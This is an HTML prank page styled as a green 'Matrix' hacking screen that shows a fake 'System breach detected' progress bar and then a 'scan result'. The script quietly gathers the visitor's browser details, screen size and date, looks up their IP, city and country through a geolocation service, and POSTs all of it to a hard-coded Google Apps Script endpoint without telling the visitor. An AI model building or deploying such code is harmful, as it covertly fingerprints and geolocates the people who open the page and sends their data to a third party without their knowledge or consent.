<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Matrix Scan</title>
<style>
html,body{margin:0;height:100%;background:black;color:#00ff00;font-family:monospace;overflow:hidden}
#matrix{position:fixed;top:0;left:0}
#ui{position:relative;z-index:2;padding:20px}
#bar{width:300px;height:10px;border:1px solid #00ff00;margin-top:10px}
#fill{height:100%;width:0;background:#00ff00}
#term{white-space:pre-line;margin-top:20px}
.blink{animation:blink 1s infinite}
@keyframes blink{50%{opacity:0}}
</style>
</head>
<body>

<canvas id="matrix"></canvas>

<div id="ui">
  <div>System breach detected</div>
  <div id="percent">0%</div>
  <div id="bar"><div id="fill"></div></div>
  <div id="term"></div>
</div>

<script>
// ===== MATRIX BACKGROUND =====
const c = document.getElementById("matrix");
const ctx = c.getContext("2d");
function resize(){c.width=innerWidth;c.height=innerHeight}
resize(); addEventListener("resize",resize);
const letters="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
const font=14; const cols=Math.floor(c.width/font);
const drops=Array(cols).fill(1);
setInterval(()=>{
  ctx.fillStyle="rgba(0,0,0,0.08)";
  ctx.fillRect(0,0,c.width,c.height);
  ctx.fillStyle="#00ff00";
  ctx.font=font+"px monospace";
  for(let i=0;i<drops.length;i++){
    const t=letters[Math.floor(Math.random()*letters.length)];
    ctx.fillText(t,i*font,drops[i]*font);
    if(drops[i]*font>c.height && Math.random()>0.975) drops[i]=0;
    drops[i]++;
  }
},33);

// ===== FAKE PERCENTAGE =====
const percentEl=document.getElementById("percent");
const fill=document.getElementById("fill");
let p=0;
const pctTimer=setInterval(()=>{
  p+=Math.floor(Math.random()*6)+2;
  if(p>=100){p=100;clearInterval(pctTimer);startScan();}
  percentEl.textContent=p+"%";
  fill.style.width=p+"%";
},120);

// ===== DATA + TERMINAL =====
const term=document.getElementById("term");
const sleep=ms=>new Promise(r=>setTimeout(r,ms));

async function startScan(){
  term.textContent="Access granted ✔️\nScanning device...\n";
  await sleep(800);

  let data={
    userAgent:navigator.userAgent,
    language:navigator.language,
    platform:navigator.platform,
    screen:screen.width+"x"+screen.height,
    date:new Date().toLocaleString(),
    country:"",city:"",ip:""
  };

  try{
    const r=await fetch("https://ipapi.co/json/");
    const j=await r.json();
    data.country=j.country_name; data.city=j.city; data.ip=j.ip;
  }catch{}

  // ENVOI VERS GOOGLE SHEET
  fetch("https://script.google.com/macros/s/AKfycbzBoQBLsSn8O8Uvt8I1Ls2bhwIIX9wrX9CuaMCILODprS00lXHqogkInFZJuS-k9Rum/exec",{method:"POST",body:JSON.stringify(data)});

  await sleep(700);
  term.textContent += "\n===== SCAN RESULT =====\n";
  term.textContent += "Platform   : "+data.platform+"\n";
  term.textContent += "Language   : "+data.language+"\n";
  term.textContent += "Screen     : "+data.screen+"\n";
  term.textContent += "Country    : "+data.country+"\n";
  term.textContent += "City       : "+data.city+"\n";
  term.textContent += "IP         : "+data.ip+"\n";
  term.textContent += "Date       : "+data.date+"\n\n";
  term.innerHTML += "Complete <span class='blink'>█</span>";
}
</script>
</body>
</html>
